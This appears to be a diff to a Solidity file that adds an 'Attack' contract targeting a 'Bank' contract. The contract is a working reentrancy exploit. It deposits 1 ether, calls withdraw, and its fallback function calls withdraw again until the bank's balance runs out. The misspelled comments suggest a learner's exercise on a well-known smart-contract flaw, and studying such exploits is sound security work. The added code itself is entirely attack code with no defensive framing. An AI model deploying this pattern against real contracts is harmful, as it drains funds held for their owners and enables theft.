@@ -22,3 +22,27 @@ contract Bank{
         return address(this).balance;
     }
 }
+
+contract Attack{
+    Bank public exploit; //<name of thetaget contract> as astate avrible called <exploit>
+
+    constructor(address _exploitAddress){
+        exploit = Bank(_exploitAddress);
+    }
+
+    fallback() external payable { 
+        if(address(exploit).balance >= 1 ether){
+            exploit.withdraw();
+        }
+    }
+
+    function attack() public  payable {
+        require(msg.value >= 1 ether);
+        exploit.deposite{value: 1 ether}();
+        exploit.withdraw();
+    }
+
+    function getBalance() public view returns(uint){
+        return address(this).balance;
+    }
+}
